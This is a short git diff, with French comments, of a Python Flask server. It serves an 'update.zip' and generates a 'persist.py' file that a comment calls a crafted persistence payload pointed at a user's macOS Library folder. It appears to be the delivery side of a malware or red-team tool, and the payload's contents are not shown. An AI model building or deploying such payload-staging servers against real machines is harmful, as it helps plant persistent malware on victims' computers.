@@ -2,12 +2,13 @@ from flask import Flask, send_file
 from flask_restful import Resource, Api
 
 
+# Retourne update.zip en cas de requête GET sur /update
 class getUpdate(Resource):
     def get(self):
         return send_file('.\\Assets\\update.zip')
 
 
-# /Users/robertbebert/Library
+# Retourne le fichier de persitance python crafté avec les chemins absolus de fichier (PATH = "/Users/{path}/Library/~$payload.zip")
 class getCraftedPayload(Resource):
     def get(self, path):
         with open('.\\Assets\\persist.py', 'w') as persist:
@@ -16,11 +17,15 @@ class getCraftedPayload(Resource):
         return send_file('.\\Assets\\persist.py')
 
 
+# Mise en place du serveur Flask
 app = Flask(__name__)
 api = Api(app)
+
+# Ajout des routes
 api.add_resource(getUpdate, '/update')
 api.add_resource(getCraftedPayload, '/<path>')
 
 
+# Permet de démarrer le serveur depuis un autre script python et de paramétrer le port et l'hôte
 def startHTTPServer(_host="0.0.0.0", _port="8080"):
     app.run(port=_port, host=_host)
